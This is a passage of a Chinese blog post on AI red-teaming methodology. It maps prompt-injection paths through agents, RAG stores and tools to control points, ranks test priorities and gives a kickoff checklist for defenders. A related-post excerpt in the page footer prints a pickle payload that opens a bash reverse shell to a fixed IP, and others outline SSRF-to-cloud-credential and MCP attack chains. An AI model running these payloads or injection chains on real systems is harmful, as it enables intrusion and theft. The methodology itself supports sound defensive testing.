+<p>这个模板比「能不能打这个 IP」复杂，但很必要。AI 测试经常涉及数据、第三方服务、成本和声誉，如果范围不清，很容易把一次评估变成业务事故。</p>
+<p><strong>所以呢：AI 红队项目启动前，授权书要回答技术边界、数据边界、成本边界和证据边界。</strong></p>
+<h2 id="六、认知六：MITRE-ATLAS-和-OWASP-是地图，不是照抄剧本"><a href="#六、认知六：MITRE-ATLAS-和-OWASP-是地图，不是照抄剧本" class="headerlink" title="六、认知六：MITRE ATLAS 和 OWASP 是地图，不是照抄剧本"></a>六、认知六：MITRE ATLAS 和 OWASP 是地图，不是照抄剧本</h2><p>很多团队会问：AI 红队是不是照着 MITRE ATLAS 或 OWASP LLM Top 10 跑一遍？</p>
+<p>这两个框架很有价值，但用法不是机械对号入座。</p>
+<table>
+<thead>
+<tr>
+<th>框架</th>
+<th>适合做什么</th>
+<th>不适合做什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MITRE ATLAS</td>
+<td>描述 AI 相关对抗行为，帮助团队按阶段组织攻击思路和检测思考</td>
+<td>不能当成“跑完即证明安全”的测试用例集</td>
+</tr>
+<tr>
+<td>OWASP LLM Top 10</td>
+<td>总结 LLM 应用常见风险，方便开发、安全和业务沟通</td>
+<td>不能替代企业自己的架构分析、数据分级和权限模型</td>
+</tr>
+<tr>
+<td>内部威胁模型</td>
+<td>结合业务资产、数据流、身份和合规要求排优先级</td>
+<td>不应该脱离真实架构抄通用模板</td>
+</tr>
+</tbody></table>
+<p>我建议的用法是三步：</p>
+<ol>
+<li><strong>用 ATLAS 和 OWASP 打开讨论。</strong> 让开发、安全、数据和业务知道 AI 风险不止“模型乱说话”。</li>
+<li><strong>把它们映射到自己的系统。</strong> 例如某条风险对应我们的知识库、工具、模型网关、Pod 身份或第三方插件。</li>
+<li><strong>转成可验证的控制点和复测项。</strong> 每个风险都要回答放在哪里修、谁来修、怎么验证。</li>
+</ol>
+<p>例如，不要只说「我们有提示注入风险」。可以拆成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">提示注入</span><br><span class="line">  ├─ 用户直接输入 → 模型上下文</span><br><span class="line">  │    控制点：输入规范化、策略层、会话隔离</span><br><span class="line">  ├─ 外部文档 → 解析 → 向量库 → 检索结果</span><br><span class="line">  │    控制点：来源审批、解析隔离、信任分级、权限感知检索</span><br><span class="line">  ├─ 工单评论 → 持久化 → 未来检索</span><br><span class="line">  │    控制点：写入审批、内容标记、定期审计、可回滚</span><br><span class="line">  ├─ 工具返回值 → 下一轮上下文</span><br><span class="line">  │    控制点：返回值白名单、schema 校验、二次注入检测</span><br><span class="line">  └─ 模型输出 → 工具参数</span><br><span class="line">       控制点：参数枚举、动作分级、人工确认、执行审计</span><br></pre></td></tr></table></figure>
+
+<p>这样框架才真正落到系统里。</p>
+<h2 id="七、国内企业常见场景的优先级"><a href="#七、国内企业常见场景的优先级" class="headerlink" title="七、国内企业常见场景的优先级"></a>七、国内企业常见场景的优先级</h2><p>不同 AI 系统的红队重点差别很大。不要每个项目都从「越狱」开始，先看业务资产和权限。</p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>典型能力</th>
+<th>红队优先问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>智能客服</td>
+<td>工单查询、知识库回答、订单解释、转人工</td>
+<td>客户数据是否越权检索？工单内容能否进入上下文？回答能否触发内部动作？</td>
+</tr>
+<tr>
+<td>企业知识库助手</td>
+<td>文档问答、摘要、权限过滤</td>
+<td>谁能上传文档？检索是否遵守部门&#x2F;租户权限？<code>sources</code> 是否暴露内部路径？</td>
+</tr>
+<tr>
+<td>代码助手</td>
+<td>代码补全、仓库问答、生成代码、执行任务</td>
+<td>仓库权限如何隔离？生成代码是否会被执行？依赖和插件是否可信？</td>
+</tr>
+<tr>
+<td>办公自动化</td>
+<td>邮件、日历、文档、审批、跨系统操作</td>
+<td>外部邮件能否影响任务？工具能否越权访问他人日程或文档？审批是否有人工确认？</td>
+</tr>
+<tr>
+<td>模型平台</td>
+<td>多租户、模型路由、配额、插件、微调</td>
+<td>租户是否隔离？模型资产能否被替换？API Key 是否可被滥用？</td>
+</tr>
+<tr>
+<td>数据分析 Agent</td>
+<td>查数据库、生成 SQL、制作报表</td>
+<td>模型能否自由生成 SQL？查询账号是否最小权限？结果是否会被外发？</td>
+</tr>
+</tbody></table>
+<p>如果你不知道先测哪个，我会按下面顺序排：</p>
+<ol>
+<li><strong>先测有外部输入的 Agent</strong>：它连接了用户输入和内部动作。</li>
+<li><strong>再测有写入能力的 RAG</strong>：写入可以造成未来触发。</li>
+<li><strong>再测跨系统工具链</strong>：邮件、审批、数据库、云 API 的影响通常比单次回答更严重。</li>
+<li><strong>最后测纯模型对话</strong>：如果没有业务权限，很多越狱只是安全策略问题，不一定是高危业务漏洞。</li>
+</ol>
+<p><strong>所以呢：红队优先级来自业务影响，不来自技术话题的热度。</strong></p>
+<h2 id="八、AI-红队启动清单"><a href="#八、AI-红队启动清单" class="headerlink" title="八、AI 红队启动清单"></a>八、AI 红队启动清单</h2><p>开工前，我会检查下面这些项。任何一项答不出来，都先补范围和架构，再谈测试。</p>
+<h3 id="A-系统与资产"><a href="#A-系统与资产" class="headerlink" title="A. 系统与资产"></a>A. 系统与资产</h3><table>
+<thead>
+<tr>
+<th>#</th>
+<th>检查项</th>
+<th>负责人</th>
+<th>需要的证据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>明确被测业务和目标</td>
+<td>业务负责人</td>
+<td>目标卡、业务流程</td>
+</tr>
+<tr>
+<td>2</td>
+<td>列出对外入口</td>
+<td>开发</td>
+<td>域名、API、客户端、鉴权方式</td>
+</tr>
+<tr>
+<td>3</td>
+<td>列出模型来源和版本</td>
+<td>平台</td>
+<td>模型名、版本、供应商、部署方式</td>
+</tr>
+<tr>
+<td>4</td>
+<td>列出模型网关和策略层</td>
+<td>平台&#x2F;安全</td>
+<td>路由、配额、过滤、审计能力</td>
+</tr>
+<tr>
+<td>5</td>
+<td>列出 RAG 来源</td>
+<td>数据&#x2F;开发</td>
+<td>知识库、网页、工单、附件、第三方文档</td>
+</tr>
+<tr>
+<td>6</td>
+<td>列出向量库和嵌入模型</td>
+<td>开发</td>
+<td>集合、权限、索引、来源字段</td>
+</tr>
+<tr>
+<td>7</td>
+<td>列出 Agent 工具</td>
+<td>开发</td>
+<td>工具名、schema、权限、目标系统</td>
+</tr>
+<tr>
+<td>8</td>
+<td>列出记忆和会话存储</td>
+<td>开发</td>
+<td>存储、隔离、保留期、删除方式</td>
+</tr>
+<tr>
+<td>9</td>
+<td>列出应用身份</td>
+<td>SRE</td>
+<td>Pod、ServiceAccount、云身份、Secret</td>
+</tr>
+<tr>
+<td>10</td>
+<td>列出日志链路</td>
+<td>安全&#x2F;SRE</td>
+<td>应用日志、模型日志、工具日志、云审计</td>
+</tr>
+</tbody></table>
+<h3 id="B-边界与规则"><a href="#B-边界与规则" class="headerlink" title="B. 边界与规则"></a>B. 边界与规则</h3><table>
+<thead>
+<tr>
+<th>#</th>
+<th>检查项</th>
+<th>负责人</th>
+<th>需要的证据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>11</td>
+<td>明确可测试环境</td>
+<td>安全+业务</td>
+<td>授权书、环境列表</td>
+</tr>
+<tr>
+<td>12</td>
+<td>明确可用数据分级</td>
+<td>数据&#x2F;法务</td>
+<td>数据类型、脱敏要求、禁止项</td>
+</tr>
+<tr>
+<td>13</td>
+<td>明确允许的测试技术</td>
+<td>安全</td>
+<td>允许&#x2F;需审批&#x2F;禁止清单</td>
+</tr>
+<tr>
+<td>14</td>
+<td>明确写入和持久化限制</td>
+<td>开发&#x2F;业务</td>
+<td>知识库、记忆、配置、账号变更规则</td>
+</tr>
+<tr>
+<td>15</td>
+<td>明确外部请求和成本限制</td>
+<td>业务&#x2F;平台</td>
+<td>预算、频率、第三方 API 限制</td>
+</tr>
+<tr>
+<td>16</td>
+<td>明确证据保存与脱敏</td>
+<td>安全</td>
+<td>存储位置、保留期、访问人员</td>
+</tr>
+<tr>
+<td>17</td>
+<td>明确止损条件</td>
+<td>业务&#x2F;安全</td>
+<td>触发风控、影响客户、数据外发时怎么办</td>
+</tr>
+<tr>
+<td>18</td>
+<td>明确联系人和响应流程</td>
+<td>业务&#x2F;安全</td>
+<td>紧急联系人、响应时间</td>
+</tr>
+<tr>
+<td>19</td>
+<td>明确修复责任</td>
+<td>开发&#x2F;安全</td>
+<td>每类风险的责任角色</td>
+</tr>
+<tr>
+<td>20</td>
+<td>明确复测标准</td>
+<td>安全</td>
+<td>修复后如何验证，回归范围是什么</td>
+</tr>
+</tbody></table>
+<p>这份清单不需要一开始就做到完美，但必须能回答：<strong>测什么、谁能同意、数据怎么处理、动作到哪里停、证据怎么保存、出事找谁。</strong></p>
+<h2 id="九、最小交付物不是漏洞截图，而是四张图"><a href="#九、最小交付物不是漏洞截图，而是四张图" class="headerlink" title="九、最小交付物不是漏洞截图，而是四张图"></a>九、最小交付物不是漏洞截图，而是四张图</h2><p>如果是一个两周期以内的 AI 红队评估，我建议至少交付：</p>
+<ol>
+<li><p><strong>组件与数据流图</strong></p>
+<ul>
+<li>谁是入口；</li>
+<li>哪些内容进入上下文；</li>
+<li>哪些结果返回给用户；</li>
+<li>哪些动作触达内部系统。</li>
+</ul>
+</li>
+<li><p><strong>信任边界图</strong></p>
+<ul>
+<li>完全不可信：用户输入、公开网页、上传文件、第三方内容；</li>
+<li>半可信：RAG chunk、历史会话、工具缓存、第三方 API 返回；</li>
+<li>应用控制：系统提示词模板、Agent 编排规则、工具 schema；</li>
+<li>内部能力：数据库、文件、邮件、审批、云 API；</li>
+<li>平台权限：Pod、ServiceAccount、云身份、CI&#x2F;CD。</li>
+</ul>
+</li>
+<li><p><strong>风险链表</strong></p>
+<ul>
+<li>每条风险都要写入口、路径、身份、目标、影响、证据和限制条件。</li>
+</ul>
+</li>
+<li><p><strong>控制点与复测清单</strong></p>
+<ul>
+<li>修复建议不能只写“加强提示词”或“增加过滤”；</li>
+<li>要写清楚校验发生在输入层、上下文层、工具层、身份层还是输出层；</li>
+<li>还要写清谁来改、什么时候改、怎么复测。</li>
+</ul>
+</li>
+</ol>
+<p>一句话总结：<strong>传统红队找的是“系统哪里可以被打破”，AI 红队找的是“模型、数据、工具、身份和业务流程组合后，哪里会变成新的权限边界”。</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cr4at0r.github.io">Cr4at0r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cr4at0r.github.io/2026/10/13/AI%E7%BA%A2%E9%98%9F%E4%B8%8D%E6%98%AF%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F-%E5%AE%89%E5%85%A8%E4%BA%BA%E5%BF%85%E9%A1%BB%E5%85%88%E9%87%8D%E5%BB%BA%E7%9A%846%E4%B8%AA%E8%AE%A4%E7%9F%A5/">https://cr4at0r.github.io/2026/10/13/AI%E7%BA%A2%E9%98%9F%E4%B8%8D%E6%98%AF%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F-%E5%AE%89%E5%85%A8%E4%BA%BA%E5%BF%85%E9%A1%BB%E5%85%88%E9%87%8D%E5%BB%BA%E7%9A%846%E4%B8%AA%E8%AE%A4%E7%9F%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cr4at0r.github.io" target="_blank">Cr4at0r's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/AI%E5%AE%89%E5%85%A8/">AI安全</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/%E6%96%B9%E6%B3%95%E8%AE%BA/">方法论</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-oss.jpeg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/10/07/AI%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-%E4%BA%91-%E5%AE%B9%E5%99%A8%E4%B8%8EGPU%E9%80%83%E9%80%B8/" title="AI基础设施安全：云、容器与GPU逃逸"><img class="cover" src="/img/avatar-oss-2.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">AI基础设施安全：云、容器与GPU逃逸</div></div><div class="info-2"><div class="info-item-1">前几篇的攻击落在模型、Agent、RAG 或供应链上。这篇要写的是更底层的场景：攻击者根本不碰模型，直接从基础设施的配置错误拿走整个环境。 一个 SSRF 拿到云账号凭证、一条 IAM 链提权到管理员、一个 Pod 里的 ServiceAccount Token 直接调 K8s API，最后从 GPU 容器逃逸到宿主机。每一步用的都是已有的功能或默认配置，不是漏洞利用。 AI 系统特别容易命中这些问题，原因是它天然把三类高危组件绑在一起：有出站 HTTP 请求能力（URL 抓取、插件调用）、跑在云上且需要 IAM 角色访问存储和模型 API、部署在 K8s 里并挂载 GPU。三者叠加后，攻击面不是加法，是乘法。 一、从 SSRF 到云凭证AI 服务几乎都有出站 HTTP 能力：Agent 的 web_fetch 工具、RAG 的 URL 入库、Webhook 回调、OpenAPI 插件的远端 schema 加载。攻击者把这些功能的 URL 参数指向云元数据端点，就能拿到当前实例的 IAM 临时凭证。 云厂商的元数据端点   云厂商 端点 版本 鉴权要求    AWS http:/...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/10/04/AI%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E4%BB%8E%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E4%BE%9D%E8%B5%96%E5%8C%85%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%9C%BA/" title="AI供应链攻击：从模型文件到依赖包的信任危机"><img class="cover" src="/img/avatar-oss.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-04</div><div class="info-item-2">AI供应链攻击：从模型文件到依赖包的信任危机</div></div><div class="info-2"><div class="info-item-1">传统供应链攻击的落点是「代码」。AI 栈把它扩成了一个更模糊的问题：哪些文件会被「执行」。 .py 当然会；.pt 模型文件会；adapter.safetensors 不会执行代码，但会改变模型输出；tokenizer.json 只是两张映射表，改动两个整数就能让分类器失效。 这篇按「被执行的程度」从高到低写：pickle 反序列化、扫描器绕过、LoRA 投毒、tokenizer 操纵、依赖混淆。每一段给出可复现的最小代码和对应防御。 一、.pt 文件是代码，不是权重PyTorch 默认格式 .pt 底层是 Python pickle。pickle 的设计目标之一就是序列化「任意对象」，加载时执行构造指令。构造 RCE 不需要漏洞： 1234567import torch, osclass RevShell:    def __reduce__(self):        return (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.2.9.7/4444 0&gt;&amp;1&#x27;&quot;,...</div></div></div></a><a class="pagination-related" href="/2026/10/07/AI%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-%E4%BA%91-%E5%AE%B9%E5%99%A8%E4%B8%8EGPU%E9%80%83%E9%80%B8/" title="AI基础设施安全：云、容器与GPU逃逸"><img class="cover" src="/img/avatar-oss-2.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-07</div><div class="info-item-2">AI基础设施安全：云、容器与GPU逃逸</div></div><div class="info-2"><div class="info-item-1">前几篇的攻击落在模型、Agent、RAG 或供应链上。这篇要写的是更底层的场景：攻击者根本不碰模型，直接从基础设施的配置错误拿走整个环境。 一个 SSRF 拿到云账号凭证、一条 IAM 链提权到管理员、一个 Pod 里的 ServiceAccount Token 直接调 K8s API，最后从 GPU 容器逃逸到宿主机。每一步用的都是已有的功能或默认配置，不是漏洞利用。 AI 系统特别容易命中这些问题，原因是它天然把三类高危组件绑在一起：有出站 HTTP 请求能力（URL 抓取、插件调用）、跑在云上且需要 IAM 角色访问存储和模型 API、部署在 K8s 里并挂载 GPU。三者叠加后，攻击面不是加法，是乘法。 一、从 SSRF 到云凭证AI 服务几乎都有出站 HTTP 能力：Agent 的 web_fetch 工具、RAG 的 URL 入库、Webhook 回调、OpenAPI 插件的远端 schema 加载。攻击者把这些功能的 URL 参数指向云元数据端点，就能拿到当前实例的 IAM 临时凭证。 云厂商的元数据端点   云厂商 端点 版本 鉴权要求    AWS http:/...</div></div></div></a><a class="pagination-related" href="/2026/09/21/MCP%E6%9A%B4%E9%9C%B2%E9%9D%A2%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-%E4%BB%8E%E5%8F%91%E7%8E%B0%E5%88%B0%E5%88%A9%E7%94%A8/" title="MCP暴露面的安全问题：从发现到利用"><img class="cover" src="/img/avatar-oss.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-21</div><div class="info-item-2">MCP暴露面的安全问题：从发现到利用</div></div><div class="info-2"><div class="info-item-1">MCP（Model Context Protocol）是 Anthropic 在 2024 年底推出的开放协议，目标是让 LLM 能以标准化方式连接外部工具、数据库和服务。一年内已有数千个 MCP Server 实现，覆盖从数据库查询到 Kubernetes 操作的各类能力。 但 MCP 的设计起点是「方便接入」，不是「安全部署」。规范没有强制认证，工具列表是公开的能力清单，资源 URI 直接暴露内部路径——这些设计选择让 MCP Server 的暴露面比传统 HTTP API 大得多。 这篇文章把 MCP 的暴露面拆开：先看协议设计带来了哪些天然的攻击面，然后走一条完整的攻击链，最后给出具体的修复建议。 MCP 协议是什么MCP 基于 JSON-RPC 2.0，定义了 Client 与 Server 之间的通信方式。Server 暴露三类能力：  Tools：LLM 可调用的函数，如 run_sql_query、deploy_to_k8s、send_email Resources：可读取的数据，如文件内容、数据库记录 Prompts：预定义的提示词模板  传输层经历了三代演进，...</div></div></div></a><a class="pagination-related" href="/2026/09/18/%E5%81%9A%E4%BA%865%E5%B9%B4%E7%BA%A2%E9%98%9F%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E7%8E%B0%E5%9C%A8%E8%BD%AC%E5%90%91AI%E5%AE%89%E5%85%A8/" title="做了5年红队，我为什么现在转向AI安全"><img class="cover" src="/img/avatar-oss-2.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-18</div><div class="info-item-2">做了5年红队，我为什么现在转向AI安全</div></div><div class="info-2"><div class="info-item-1">做了 5 年渗透测试和红队，我最近意识到一件事：我熟悉的攻击方法论，正在被 AI 以另一种方式重新定义。 我的背景先简单介绍一下我自己。 过去 5 年，我一直在一线做攻防。从最初的渗透测试做起，Web、内网、域渗透、社工，能打的都打过。后来慢慢从执行者变成了红队负责人，开始负责整个攻击链的规划、团队管理和项目交付。 这个过程中积累了什么？最重要的不是某一个漏洞的利用技巧，而是一种攻击者思维：面对一个目标系统，习惯性地去想——它哪里最脆弱？攻击路径是什么？防御方会在哪里设卡？我怎么绕过去？ 这种思维方式，在过去 5 年里帮我打穿了很多项目。但现在，我发现它面对的东西变了。 为什么是现在促使我认真思考转向 AI 安全的，是几个叠在一起的变化。 第一，攻击面正在快速扩张。 传统渗透测试里，我们的目标很清晰：Web 应用、内网服务、域环境、云基础设施。但过去一年，越来越多的系统开始把 LLM 嵌入到核心业务逻辑里——客服、代码生成、数据分析、自动化运维。这意味着一个全新的攻击面出现了：模型本身。 提示注入、越狱、训练数据泄露、Agent 工具滥用、RAG 投毒……这些攻击手法在两三年前几...</div></div></div></a><a class="pagination-related" href="/2026/09/22/%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BB%E5%8D%95%E4%B8%AAAgent%E7%B3%BB%E7%BB%9F/" title="如何攻击单个Agent系统"><img class="cover" src="/img/avatar-oss-2.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-22</div><div class="info-item-2">如何攻击单个Agent系统</div></div><div class="info-2"><div class="info-item-1">和 Chatbot 相比，Agent 多出来的不只是「能调用工具」，还有一个更隐蔽的变化——决策链变长了。用户的问题会走这条链：意图识别 → 工具选择 → 参数构造 → 工具执行 → 结果回读 → 结果整合 → 回答用户。 这条链条上每一步都在用 LLM 做判断。攻击的着眼点因此变化：Chatbot 场景你要骗的是「模型的输出」，Agent 场景你要骗的是**「模型的决策」**——让它选错工具、拼错参数、把不可信数据当成可信指令。 而且 Agent 天然持有一套服务侧凭证：数据库连接串、内部 API 的 Bearer Token、文件系统的账号。普通用户拿不到的东西，Agent 都拿得到。把 Agent 骗过去，等于把服务权限转嫁给了攻击者。 这就是传统安全里 Confused Deputy（被滥用的合法代理人）问题在 AI 时代的翻版。 这篇文章把单 Agent 的攻击面按这条链路的位置拆开：枚举、决策阶段的提示注入、工具输出注入、参数注入、输出侧的利用。最后给出对应的防御设计。 一、Agent 架构的攻击面从哪来一个跑在 FastAPI 后面的典型企业内部 Agent，用户请...</div></div></div></a><a class="pagination-related" href="/2026/09/20/LLM%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E9%9D%A2%E5%85%A8%E6%99%AF-%E4%B8%80%E4%B8%AA%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E7%9A%84%E5%88%86%E6%9E%90/" title="LLM安全攻击面全景：一个红队视角的分析"><img class="cover" src="/img/avatar-oss.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-20</div><div class="info-item-2">LLM安全攻击面全景：一个红队视角的分析</div></div><div class="info-2"><div class="info-item-1">做红队的时候，接到一个新目标，我做的第一件事不是找漏洞，而是画攻击面——把所有可能的入口、信任边界、数据流向全部列出来，然后再决定从哪里下手。 面对 AI 系统，我做同样的事。但很快我发现，传统侦察方法论在这里几乎完全失效。 你跑一遍 nmap、whatweb、dirb，目标只暴露一个 443 端口和一张干净的前端页面。所有流量都是规规矩矩的 HTTPS JSON。从外部看，这面墙光滑得没有缝。 但攻击面就在那里——只是不在端口上。 这篇文章，我先把 AI 系统的攻击面全部画出来——从模型到应用，从 Agent 到基础设施，包括多模态和安全性的维度——然后逐层拆开，讲清楚每个攻击面怎么被发现、底层问题是什么。 先看全景一个现代 AI 系统不是单一组件，是一个多层堆栈。每一层都有独立的攻击面，层与层之间还能组合成攻击链。  七个层级，加上三个跨层维度——这就是完整的攻击面。一次真实的攻击往往贯穿多层：  通过 HTTP 头确认模型版本（侦察）→ 利用提示注入覆盖安全指令（应用层）→ 控制 Agent 调用工具读取敏感数据（Agent 层）→ 通过 RAG 的 sources 字段外...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cr4at0r</div><div class="author-info-description">欢迎来到Cr4at0r的博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%AE%A4%E7%9F%A5%E4%B8%80%EF%BC%9AAI-%E7%BA%A2%E9%98%9F%E6%B5%8B%E7%9A%84%E6%98%AF%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text">一、认知一：AI 红队测的是系统，不只是模型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%AE%A4%E7%9F%A5%E4%BA%8C%EF%BC%9A%E6%94%BB%E5%87%BB%E9%9D%A2%E4%B8%8D%E5%9C%A8%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8%E9%87%8C%EF%BC%8C%E8%80%8C%E5%9C%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E5%92%8C%E6%9D%83%E9%99%90%E5%9B%BE%E9%87%8C"><span class="toc-number">2.</span> <span class="toc-text">二、认知二：攻击面不在端口列表里，而在数据流和权限图里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%AE%A4%E7%9F%A5%E4%B8%89%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E3%80%81%E6%95%B0%E6%8D%AE%E3%80%81%E6%A8%A1%E5%9E%8B%E3%80%81%E5%BA%94%E7%94%A8%E8%A6%81%E4%B8%B2%E8%B5%B7%E6%9D%A5%E7%9C%8B"><span class="toc-number">3.</span> <span class="toc-text">三、认知三：基础设施、数据、模型、应用要串起来看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E8%AE%A4%E7%9F%A5%E5%9B%9B%EF%BC%9A%E8%BE%93%E5%87%BA%E4%B8%8D%E7%A1%AE%E5%AE%9A%EF%BC%8C%E8%AF%81%E6%8D%AE%E9%93%BE%E5%BF%85%E9%A1%BB%E9%87%8D%E6%96%B0%E5%AE%9A%E4%B9%89"><span class="toc-number">4.</span> <span class="toc-text">四、认知四：输出不确定，证据链必须重新定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E8%AE%A4%E7%9F%A5%E4%BA%94%EF%BC%9A%E6%8E%88%E6%9D%83%E4%B8%8D%E5%8F%AA%E6%98%AF%E2%80%9C%E8%83%BD%E4%B8%8D%E8%83%BD%E8%AE%BF%E9%97%AE%E6%9F%90%E4%B8%AA-URL%E2%80%9D"><span class="toc-number">5.</span> <span class="toc-text">五、认知五：授权不只是“能不能访问某个 URL”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%AE%A4%E7%9F%A5%E5%85%AD%EF%BC%9AMITRE-ATLAS-%E5%92%8C-OWASP-%E6%98%AF%E5%9C%B0%E5%9B%BE%EF%BC%8C%E4%B8%8D%E6%98%AF%E7%85%A7%E6%8A%84%E5%89%A7%E6%9C%AC"><span class="toc-number">6.</span> <span class="toc-text">六、认知六：MITRE ATLAS 和 OWASP 是地图，不是照抄剧本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%9B%BD%E5%86%85%E4%BC%81%E4%B8%9A%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-number">7.</span> <span class="toc-text">七、国内企业常见场景的优先级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81AI-%E7%BA%A2%E9%98%9F%E5%90%AF%E5%8A%A8%E6%B8%85%E5%8D%95"><span class="toc-number">8.</span> <span class="toc-text">八、AI 红队启动清单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-%E7%B3%BB%E7%BB%9F%E4%B8%8E%E8%B5%84%E4%BA%A7"><span class="toc-number">8.1.</span> <span class="toc-text">A. 系统与资产</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%84%E5%88%99"><span class="toc-number">8.2.</span> <span class="toc-text">B. 边界与规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%9C%80%E5%B0%8F%E4%BA%A4%E4%BB%98%E7%89%A9%E4%B8%8D%E6%98%AF%E6%BC%8F%E6%B4%9E%E6%88%AA%E5%9B%BE%EF%BC%8C%E8%80%8C%E6%98%AF%E5%9B%9B%E5%BC%A0%E5%9B%BE"><span class="toc-number">9.</span> <span class="toc-text">九、最小交付物不是漏洞截图，而是四张图</span></a></li></ol></div></div><div class="card-widget 